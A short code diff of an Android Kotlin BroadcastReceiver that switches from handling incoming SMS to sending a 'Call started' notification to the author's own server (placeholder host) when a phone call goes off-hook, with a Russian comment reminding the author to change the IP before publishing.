@@ -10,11 +10,15 @@ import java.io.InputStream
 import java.security.KeyStore
 import javax.net.ssl.SSLContext
 import javax.net.ssl.TrustManagerFactory
+import android.telephony.TelephonyManager
 
 class Receiver : BroadcastReceiver() {
     override fun onReceive(context: Context?, intent: Intent?) {
-        if (intent?.action == "android.provider.Telephony.SMS_RECEIVED") {
-            sendNotificationToServer(context, "1234567890")
+        if (intent?.action == "android.intent.action.PHONE_STATE") {
+            val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
+            if (state == TelephonyManager.EXTRA_STATE_OFFHOOK) {
+                sendNotificationToServer(context, "Call started")
+            }
         }
     }
 
@@ -25,6 +29,7 @@ class Receiver : BroadcastReceiver() {
                     .sslSocketFactory(createSslSocketFactory(context), createTrustManager(context))
                     .build()
 
+                // Не забудь поменять ip перед тем как выложить :)
                 val url = "https://here/notify?number=$number"
                 val request = Request.Builder().url(url).build()
 
